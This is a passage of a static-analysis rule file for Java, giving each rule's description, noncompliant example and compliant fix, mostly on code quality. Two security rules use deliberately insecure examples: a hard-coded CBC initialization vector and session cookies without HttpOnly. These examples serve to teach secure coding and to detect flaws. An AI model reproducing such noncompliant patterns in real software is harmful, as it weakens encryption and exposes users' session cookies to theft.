    </rule>

    <rule key='S3281' priority='BLOCKER'>
        <configKey>S3281</configKey>
        <name>Default EJB interceptors should be declared in &quot;ejb-jar.xml&quot;</name>
        <description>
            &lt;p&gt;Default interceptors, such as application security interceptors, must be listed in the &lt;code&gt;ejb-jar.xml&lt;/code&gt;
            file, or they will not be treated
            as default.&lt;/p&gt;
            &lt;p&gt;This rule applies to projects that contain JEE Beans (any one of &lt;code&gt;javax.ejb.Singleton&lt;/code&gt;,
            &lt;code&gt;MessageDriven&lt;/code&gt;,
            &lt;code&gt;Stateless&lt;/code&gt; or &lt;code&gt;Stateful&lt;/code&gt;).&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            // file: ejb-interceptors.xml
            &amp;lt;assembly-descriptor&amp;gt;
            &amp;lt;interceptor-binding&amp;gt; &amp;lt;!-- should be declared in ejb-jar.xml --&amp;gt;
            &amp;lt;ejb-name&amp;gt;*&amp;lt;/ejb-name&amp;gt;
            &amp;lt;interceptor-class&amp;gt;com.myco.ImportantInterceptor&amp;lt;/interceptor-class&amp;gt; &amp;lt;!--
            Noncompliant; will NOT be treated as default --&amp;gt;
            &amp;lt;/interceptor-binding&amp;gt;
            &amp;lt;/assembly-descriptor&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            // file: ejb-jar.xml
            &amp;lt;assembly-descriptor&amp;gt;
            &amp;lt;interceptor-binding&amp;gt;
            &amp;lt;ejb-name&amp;gt;*&amp;lt;/ejb-name&amp;gt;
            &amp;lt;interceptor-class&amp;gt;com.myco.ImportantInterceptor&amp;lt;/interceptor-class&amp;gt;
            &amp;lt;/interceptor-binding&amp;gt;
            &amp;lt;/assembly-descriptor&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>owasp-a6</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S3305' priority='CRITICAL'>
        <configKey>S3305</configKey>
        <name>Factory method injection should be used in &quot;@Configuration&quot; classes</name>
        <description>
            &lt;p&gt;When &lt;code&gt;@Autowired&lt;/code&gt; is used, dependencies need to be resolved when the class
            is instantiated, which may cause early initialization of
            beans or lead the context to look in places it shouldn't to find the bean. To avoid this tricky issue and
            optimize the way the context loads,
            dependencies should be requested as late as possible. That means using parameter injection instead of field
            injection for dependencies that are only
            used in a single &lt;code&gt;@Bean&lt;/code&gt; method.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Configuration
            public class ​FooConfiguration {

            @Autowired private ​DataSource dataSource​; // Noncompliant

            @Bean
            public ​MyService myService() {
            return new ​MyService(this​.dataSource​);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Configuration
            public class ​FooConfiguration {

            @Bean
            public ​MyService myService(DataSource dataSource) {
            return new ​MyService(dataSource);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Fields used in methods that are called directly by other methods in the application (as opposed to
            being invoked automatically by the Spring
            framework) are ignored by this rule so that direct callers don't have to provide the dependencies
            themselves.&lt;/p&gt;
        </description>
        <tag>performance</tag>
        <tag>spring</tag>
    </rule>

    <rule key='S3329' priority='CRITICAL'>
        <configKey>S3329</configKey>
        <name>Cipher Block Chaining IV's should be unpredictable</name>
        <description>
            &lt;p&gt;When encrypting data with the Cipher Block Chaining (CBC) mode an Initialization Vector (IV) is
            used to randomize the encryption, ie under a given
            key the same plaintext doesn't always produce the same ciphertext. The IV doesn't need to be secret but
            should be unpredictable to avoid
            &quot;Chosen-Plaintext Attack&quot;.&lt;/p&gt;
            &lt;p&gt;To generate Initialization Vectors, NIST recommends to use a secure random number generator.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyCbcClass {

            public String applyCBC(String strKey, String plainText) {
            byte[] bytesIV = &quot;7cVgr5cbdCZVw5WY&quot;.getBytes(&quot;UTF-8&quot;);

            /* KEY + IV setting */
            IvParameterSpec iv = new IvParameterSpec(bytesIV);
            SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);

            /* Ciphering */
            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
            cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv); // Noncompliant: the IV is hard coded and thus not generated
            with a secure random generator
            byte[] encryptedBytes = cipher.doFinal(plainText.getBytes(&quot;UTF-8&quot;));
            return DatatypeConverter.printBase64Binary(bytesIV)
            + &quot;;&quot; + DatatypeConverter.printBase64Binary(encryptedBytes);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyCbcClass {

            SecureRandom random = new SecureRandom();

            public String applyCBC(String strKey, String plainText) {
            byte[] bytesIV = new byte[16];
            random.nextBytes(bytesIV);

            /* KEY + IV setting */
            IvParameterSpec iv = new IvParameterSpec(bytesIV);
            SecretKeySpec skeySpec = new SecretKeySpec(strKey.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);

            /* Ciphering */
            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
            cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv); // Compliant
            byte[] encryptedBytes = cipher.doFinal(plainText.getBytes(&quot;UTF-8&quot;));
            return DatatypeConverter.printBase64Binary(bytesIV)
            + &quot;;&quot; + DatatypeConverter.printBase64Binary(encryptedBytes);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/329&quot;&gt;MITRE, CWE-329&lt;/a&gt; -
            CWE-329: Not Using an Unpredictable IV with CBC Mode &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/330&quot;&gt;MITRE, CWE-330&lt;/a&gt; -
            Use of Insufficiently Random Values &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf&quot;&gt;NIST,
            SP-800-38A&lt;/a&gt; - Recommendation for Block Cipher
            Modes of Operation &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://find-sec-bugs.github.io/bugs.htm#STATIC_IV&quot;&gt;STATIC_IV&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a6</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S3330' priority='MINOR'>
        <configKey>S3330</configKey>
        <name>Creating cookies without the &quot;HttpOnly&quot; flag is security-sensitive</name>
        <description>
            &lt;p&gt;When a cookie is configured with the &lt;code&gt;HttpOnly&lt;/code&gt; attribute set to &lt;em&gt;true&lt;/em&gt;,
            the browser guaranties that no client-side script will
            be able to read it. In most cases, when a cookie is created, the default value of &lt;code&gt;HttpOnly&lt;/code&gt;
            is &lt;em&gt;false&lt;/em&gt; and it's up to the developer
            to decide whether or not the content of the cookie can be read by the client-side script. As a majority of
            Cross-Site Scripting (XSS) attacks target
            the theft of session-cookies, the &lt;code&gt;HttpOnly&lt;/code&gt; attribute can help to reduce their
            impact as it won't be possible to exploit the XSS
            vulnerability to steal session-cookies.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; the cookie is sensitive, used to authenticate the user, for instance a &lt;em&gt;session-cookie&lt;/em&gt;
            &lt;/li&gt;
            &lt;li&gt; the &lt;code&gt;HttpOnly&lt;/code&gt; attribute offer an additional protection (not the case for
            an &lt;em&gt;XSRF-TOKEN cookie&lt;/em&gt; / CSRF token for example)
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; By default the &lt;code&gt;HttpOnly&lt;/code&gt; flag should be set to &lt;em&gt;true&lt;/em&gt;
            for most of the cookies and it's mandatory for session /
            sensitive-security cookies. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;If you create a security-sensitive cookie in your JAVA code:&lt;/p&gt;
            &lt;pre&gt;
            Cookie c = new Cookie(COOKIENAME, sensitivedata);
            c.setHttpOnly(false); // Sensitive: this sensitive cookie is created with the httponly flag set to false and
            so it can be stolen easily in case of XSS vulnerability
            &lt;/pre&gt;
            &lt;p&gt;By default the &lt;a href=&quot;https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly(boolean)&quot;&gt;&lt;code&gt;HttpOnly&lt;/code&gt;&lt;/a&gt;
            flag is
            set to &lt;em&gt;false:&lt;/em&gt;&lt;/p&gt;
            &lt;pre&gt;
            Cookie c = new Cookie(COOKIENAME, sensitivedata); // Sensitive: this sensitive cookie is created with the
            httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS
            vulnerability
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Cookie c = new Cookie(COOKIENAME, sensitivedata);
            c.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly=true)
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)&quot;&gt;OWASP
            Top 10 2017 Category A7&lt;/a&gt; - Cross-Site Scripting
            (XSS) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/79.html&quot;&gt;CWE-79&lt;/a&gt; -
            Improper Neutralization of Input During Web Page Generation ('Cross-site
            Scripting') &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/1004.html&quot;&gt;CWE-1004&lt;/a&gt; -
            Sensitive Cookie Without 'HttpOnly' Flag &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat1&quot;&gt;SANS Top 25&lt;/a&gt;
            - Insecure Interaction Between Components &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE&quot;&gt;HTTPONLY_COOKIE&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a7</tag>
        <tag>privacy</tag>
        <tag>sans-top25-insecure</tag>
        <securityStandards>
            <cwe>79,1004</cwe>
            <OWASP>A7</OWASP>
        </securityStandards>
    </rule>

    <rule key='S3346' priority='MAJOR'>
        <configKey>S3346</configKey>
        <name>Expressions used in &quot;assert&quot; should not produce side effects</name>
        <description>
            &lt;p&gt;Since &lt;code&gt;assert&lt;/code&gt; statements aren't executed by default (they must be enabled
            with JVM flags) developers should never rely on their
            execution the evaluation of any logic required for correct program function.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            assert myList.remove(myList.get(0)); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            boolean removed = myList.remove(myList.get(0));
            assert removed;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/mjdGBQ&quot;&gt;CERT, EXP06-J.&lt;/a&gt; -
            Expressions used in assertions must not produce side effects &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S3355' priority='CRITICAL'>
        <configKey>S3355</configKey>
        <name>Defined filters should be used</name>
        <description>
            &lt;p&gt;Every filter defined in &lt;code&gt;web.xml&lt;/code&gt; file should be used in a &lt;code&gt;&amp;lt;filter-mapping&amp;gt;&lt;/code&gt;
            element. Otherwise such filters are not
            invoked.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;filter&amp;gt;
            &amp;lt;filter-name&amp;gt;DefinedNotUsed&amp;lt;/filter-name&amp;gt;
            &amp;lt;filter-class&amp;gt;com.myco.servlet.ValidationFilter&amp;lt;/filter-class&amp;gt;
            &amp;lt;/filter&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;filter&amp;gt;
            &amp;lt;filter-name&amp;gt;ValidationFilter&amp;lt;/filter-name&amp;gt;
            &amp;lt;filter-class&amp;gt;com.myco.servlet.ValidationFilter&amp;lt;/filter-class&amp;gt;
            &amp;lt;/filter&amp;gt;

            &amp;lt;filter-mapping&amp;gt;
            &amp;lt;filter-name&amp;gt;ValidationFilter&amp;lt;/filter-name&amp;gt;
            &amp;lt;url-pattern&amp;gt;/*&amp;lt;/url-pattern&amp;gt;
            &amp;lt;/filter-mapping&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>owasp-a6</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S3358' priority='MAJOR'>
        <configKey>S3358</configKey>
        <name>Ternary operators should not be nested</name>
        <description>
            &lt;p&gt;Just because you &lt;em&gt;can&lt;/em&gt; do something, doesn't mean you should, and that's the
            case with nested ternary operations. Nesting ternary operators
            results in the kind of code that may seem clear as day when you write it, but six months later will leave
            maintainers (or worse - future you)
            scratching their heads and cursing.&lt;/p&gt;
            &lt;p&gt;Instead, err on the side of clarity, and use another line to express the nested operation as a
            separate statement.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public String getReadableStatus(Job j) {
            return j.isRunning() ? &quot;Running&quot; : j.hasErrors() ? &quot;Failed&quot; : &quot;Succeeded&quot;; //
            Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public String getReadableStatus(Job j) {
            if (j.isRunning()) {
            return &quot;Running&quot;;
            }
            return j.hasErrors() ? &quot;Failed&quot; : &quot;Succeeded&quot;;
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S3374' priority='BLOCKER'>
        <configKey>S3374</configKey>
        <name>Struts validation forms should have unique names</name>
        <description>
            &lt;p&gt;According to the Common Weakness Enumeration,&lt;/p&gt;
            &lt;blockquote&gt;
            If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use
            for input validation and discards the
            other. This decision might not correspond to the programmer's expectations...
            &lt;/blockquote&gt;
            &lt;p&gt;In such a case, it is likely that the two forms should be combined. At the very least, one should
            be removed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;form-validation&amp;gt;
            &amp;lt;formset&amp;gt;
            &amp;lt;form name=&quot;BookForm&quot;&amp;gt; ... &amp;lt;/form&amp;gt;
            &amp;lt;form name=&quot;BookForm&quot;&amp;gt; ... &amp;lt;/form&amp;gt; &amp;lt;!-- Noncompliant --&amp;gt;
            &amp;lt;/formset&amp;gt;
            &amp;lt;/form-validation&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;form-validation&amp;gt;
            &amp;lt;formset&amp;gt;
            &amp;lt;form name=&quot;BookForm&quot;&amp;gt; ... &amp;lt;/form&amp;gt;
            &amp;lt;/formset&amp;gt;
            &amp;lt;/form-validation&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/102.html&quot;&gt;MITRE, CWE-102&lt;/a&gt;
            - Struts: Duplicate Validation Forms &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation&quot;&gt;OWASP,
            Improper Data Validation&lt;/a&gt; - Struts: Duplicate
            Validation Forms &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>struts</tag>
        <securityStandards>
            <cwe>102</cwe>
        </securityStandards>
    </rule>

    <rule key='S3398' priority='MINOR'>
        <configKey>S3398</configKey>
        <name>&quot;private&quot; methods called only by inner classes should be moved to those classes</name>
        <description>
            &lt;p&gt;When a &lt;code&gt;private&lt;/code&gt; method is only invoked by an inner class, there's no reason
            not to move it into that class. It will still have the same
            access to the outer class' members, but the outer class will be clearer and less cluttered.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Outie {
            private int i=0;

            private void increment() { // Noncompliant
            i++;
            }

            public class Innie {
            public void doTheThing() {
            Outie.this.increment();
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Outie {
            private int i=0;

            public class Innie {
            public void doTheThing() {
            increment();
            }

            private void increment() {
            Outie.this.i++;
            }
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S3400' priority='MINOR'>
        <configKey>S3400</configKey>
        <name>Methods should not return constants</name>
        <description>
            &lt;p&gt;There's no point in forcing the overhead of a method call for a method that always returns the same
            constant value. Even worse, the fact that a
            method call must be made will likely mislead developers who call the method thinking that something more is
            done. Declare a constant instead. &lt;/p&gt;
            &lt;p&gt;This rule raises an issue if on methods that contain only one statement: the &lt;code&gt;return&lt;/code&gt;
            of a constant value. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int getBestNumber() {
            return 12; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            static final int BEST_NUMBER = 12;
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Methods with annotations, such as &lt;code&gt;@Override&lt;/code&gt; and Spring's &lt;code&gt;@RequestMapping&lt;/code&gt;,
            are ignored.&lt;/p&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S3415' priority='MAJOR'>
        <configKey>S3415</configKey>
        <name>Assertion arguments should be passed in the correct order</name>
        <description>
            &lt;p&gt;The standard assertions library methods such as &lt;code&gt;org.junit.Assert.assertEquals&lt;/code&gt;,
            and &lt;code&gt;org.junit.Assert.assertSame&lt;/code&gt; expect the
            first argument to be the expected value and the second argument to be the actual value. For AssertJ, it's
            the other way around, the argument of
            &lt;code&gt;org.assertj.core.api.Assertions.assertThat&lt;/code&gt; is the actual value, and the subsequent
            calls contain the expected values. Swap them, and your
            test will still have the same outcome (succeed/fail when it should) but the error messages will be
            confusing. &lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the actual argument to an assertions library method is a hard-coded
            value and the expected argument is not.&lt;/p&gt;
            &lt;p&gt;Supported frameworks:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit4 &lt;/li&gt;
            &lt;li&gt; JUnit5 &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://assertj.github.io/doc/&quot;&gt;AssertJ&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            org.junit.Assert.assertEquals(runner.exitCode(), 0, &quot;Unexpected exit code&quot;); // Noncompliant;
            Yields error message like: Expected:&amp;lt;-1&amp;gt;. Actual:&amp;lt;0&amp;gt;.
            org.assertj.core.api.Assertions.assertThat(0).isEqualTo(runner.exitCode()); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            org.junit.Assert.assertEquals(0, runner.exitCode(), &quot;Unexpected exit code&quot;);
            org.assertj.core.api.Assertions.assertThat(runner.exitCode()).isEqualTo(0);
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>suspicious</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S3416' priority='MINOR'>
        <configKey>S3416</configKey>
        <name>Loggers should be named for their enclosing classes</name>
        <description>
            &lt;p&gt;It is convention to name each class's logger for the class itself. Doing so allows you to set up
            clear, communicative logger configuration. Naming
            loggers by some other convention confuses configuration, and using the same class name for multiple class
            loggers prevents the granular configuration
            of each class' logger. Some libraries, such as SLF4J warn about this, but not all do.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a logger is not named for its enclosing class.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            private final static Logger LOG = LoggerFactory.getLogger(WrongClass.class); // Noncompliant; multiple
            classes using same logger
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            private final static Logger LOG = LoggerFactory.getLogger(MyClass.class);
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S3421' priority='MINOR'>
        <configKey>S3421</configKey>
        <name>Deprecated &quot;${pom}&quot; properties should not be used</name>
        <description>
            &lt;p&gt;Deprecated features are those that have been retained temporarily for backward compatibility, but
            which will eventually be removed. In effect,
            deprecation announces a grace period to allow the smooth transition from the old features to the new ones.
            In that period, no use of the deprecated
            features should be added, and all existing uses should be gradually removed.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;${pom.*}&lt;/code&gt; properties are used in a pom.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;build&amp;gt;
            &amp;lt;finalName&amp;gt;${pom.artifactId}-${pom.version}&amp;lt;/finalName&amp;gt; &amp;lt;!-- Noncompliant
            --&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;build&amp;gt;
            &amp;lt;finalName&amp;gt;${project.artifactId}-${project.version}&amp;lt;/finalName&amp;gt;
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;build&amp;gt;
            &amp;lt;finalName&amp;gt;${artifactId}-${version}&amp;lt;/finalName&amp;gt;
            &lt;/pre&gt;
        </description>
        <tag>maven</tag>
        <tag>obsolete</tag>
    </rule>

    <rule key='S3422' priority='CRITICAL'>
        <configKey>S3422</configKey>
        <name>Dependencies should not have &quot;system&quot; scope</name>
        <description>
            &lt;p&gt;&lt;code&gt;system&lt;/code&gt; dependencies are sought at a specific, specified path. This
            drastically reduces portability because if you deploy your artifact
            in an environment that's not configured just like yours is, your code won't work. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;javax.sql&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;jdbc-stdext&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;2.0&amp;lt;/version&amp;gt;
            &amp;lt;scope&amp;gt;system&amp;lt;/scope&amp;gt; &amp;lt;!-- Noncompliant --&amp;gt;
            &amp;lt;systemPath&amp;gt;/usr/bin/lib/rt.jar&amp;lt;/systemPath&amp;gt; &amp;lt;!-- remove this --&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &lt;/pre&gt;
        </description>
        <tag>lock-in</tag>
        <tag>maven</tag>
    </rule>

    <rule key='S3436' priority='MAJOR'>
        <configKey>S3436</configKey>
        <name>Value-based classes should not be used for locking</name>
        <description>
            &lt;p&gt;According to the documentation,&lt;/p&gt;
            &lt;blockquote&gt;
            A program may produce unpredictable results if it attempts to distinguish two references to equal values of
            a value-based class, whether directly
            via reference equality or indirectly via an appeal to synchronization...
            &lt;/blockquote&gt;
            &lt;p&gt;This is because value-based classes are intended to be wrappers for value types, which will be
            primitive-like collections of data (similar to
            &lt;code&gt;struct&lt;/code&gt;s in other languages) that will come in future versions of Java.&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;Instances of a value-based class ... &lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; do not have accessible constructors, but are instead instantiated through factory methods which
            make no commitment as to the identity of
            returned instances; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;This means that you can't be sure you're the only one trying to lock on any given instance of a
            value-based class, opening your code up to
            contention and deadlock issues.&lt;/p&gt;
            &lt;p&gt;Under Java 8 breaking this rule may not actually break your code, but there are no guarantees of
            the behavior beyond that.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a known value-based class is used for synchronization. That includes
            all the classes in the &lt;code&gt;java.time&lt;/code&gt;
            package except &lt;code&gt;Clock&lt;/code&gt;; the date classes for alternate calendars, &lt;code&gt;HijrahDate&lt;/code&gt;,
            &lt;code&gt;JapaneseDate&lt;/code&gt;,
            &lt;code&gt;MinguoDate&lt;/code&gt;, &lt;code&gt;ThaiBuddhistDate&lt;/code&gt;; and the optional classes:
            &lt;code&gt;Optional&lt;/code&gt;, &lt;code&gt;OptionalDouble&lt;/code&gt;,
            &lt;code&gt;OptionalLong&lt;/code&gt;, &lt;code&gt;OptionalInt&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Optional&amp;lt;Foo&amp;gt; fOpt = doSomething();
            synchronized (fOpt) { // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html&quot;&gt;Value-based
            classes&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java8</tag>
        <tag>lock-in</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S3438' priority='MAJOR'>
        <configKey>S3438</configKey>
        <name>&quot;SingleConnectionFactory&quot; instances should be set to &quot;reconnectOnException&quot;</name>
        <description>
            &lt;p&gt;Use of a Spring &lt;code&gt;SingleConnectionFactory&lt;/code&gt; without enabling the &lt;code&gt;reconnectOnException&lt;/code&gt;
            setting will prevent automatic
            connection recovery when the connection goes bad. &lt;/p&gt;
            &lt;p&gt;That's because the &lt;code&gt;reconnectOnException&lt;/code&gt; property defaults to &lt;code&gt;false&lt;/code&gt;.
            As a result, even if the code that uses this
            connection factory (Spring's &lt;code&gt;DefaultMessageListenerContainer&lt;/code&gt; or your own code) has
            reconnect logic, that code won't work because the
            &lt;code&gt;SingleConnectionFactory&lt;/code&gt; will act like a single-connection pool by preventing
            connection &lt;code&gt;close&lt;/code&gt; calls from actually closing
            anything. As a result, subsequent factory &lt;code&gt;create&lt;/code&gt; operations will just hand back the
            original broken &lt;code&gt;Connection&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;bean id=&quot;singleCF&quot; class=&quot;org.springframework.jms.connection.SingleConnectionFactory&quot;&amp;gt;
            &amp;lt;!-- Noncompliant --&amp;gt;
            &amp;lt;constructor-arg ref=&quot;dummyConnectionFactory&quot; /&amp;gt;
            &amp;lt;/bean&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;bean id=&quot;singleCF&quot; class=&quot;org.springframework.jms.connection.SingleConnectionFactory&quot;
            p:reconnectOnException=&quot;true&quot;&amp;gt;
            &amp;lt;constructor-arg ref=&quot;dummyConnectionFactory&quot; /&amp;gt;
            &amp;lt;/bean&amp;gt;
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
